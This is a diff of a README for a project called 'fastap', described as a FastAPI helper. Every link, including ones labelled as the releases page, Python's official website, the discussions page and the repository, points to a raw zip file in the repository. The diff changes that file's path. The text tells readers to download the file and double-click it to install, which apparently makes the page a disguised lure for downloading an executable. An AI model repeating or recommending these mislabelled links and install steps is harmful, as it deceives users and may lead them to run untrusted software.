@@ -1,6 +1,6 @@
 # 🚀 fastap - Simplifying Your FastAPI Projects
 
-[![Download fastap](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip)](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip)
+[![Download fastap](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip)](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip)
 
 ## 📦 Introduction
 
@@ -18,11 +18,11 @@ To begin using fastap, follow these steps:
 
 To get fastap:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip) to download the latest version of fastap. 
+1. Visit the [Releases page](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip) to download the latest version of fastap. 
 2. On the releases page, you’ll see a list of versions. Look for the most recent version, indicated by the tag "Latest Release."
 3. Click on the link to download the software. 
 
-   ![Download fastap](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip)
+   ![Download fastap](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip)
 
 4. After the download completes, locate the downloaded file. This file will typically be in your Downloads folder. 
 5. Double-click the file to begin the installation process, and follow the prompts to complete the installation.
@@ -34,7 +34,7 @@ Before installing fastap, ensure your system meets the following requirements:
 - **Operating System:** You can use Windows, macOS, or Linux. Make sure your operating system is up to date.
 - **Storage:** At least 50 MB of free disk space.
 - **Memory:** Minimum of 2 GB of RAM.
-- **Python:** FastAPI requires Python 3.6 or higher. Install Python if you have not done so already. You can download it from the [official website](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip).
+- **Python:** FastAPI requires Python 3.6 or higher. Install Python if you have not done so already. You can download it from the [official website](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip).
 
 ## 📝 How to Use fastap
 
@@ -81,11 +81,11 @@ Absolutely! fastap is open-source software, and you can use it without any cost.
 
 **3. Where can I find more assistance?**
 
-If you need help, visit the [GitHub Discussions page](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip) to ask questions or find answers from the community.
+If you need help, visit the [GitHub Discussions page](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip) to ask questions or find answers from the community.
 
 ## 📞 Contact
 
-For further assistance, please reach out to the project creator through the [GitHub Repository](https://raw.githubusercontent.com/johnnydough1919/fastap/main/sageness/fastap.zip) or check the issues section for common questions and feedback.
+For further assistance, please reach out to the project creator through the [GitHub Repository](https://github.com/johnnydough1919/fastap/raw/refs/heads/main/fastapi_scaff/Software_3.7.zip) or check the issues section for common questions and feedback.
 
 ## 📊 Contributions
 
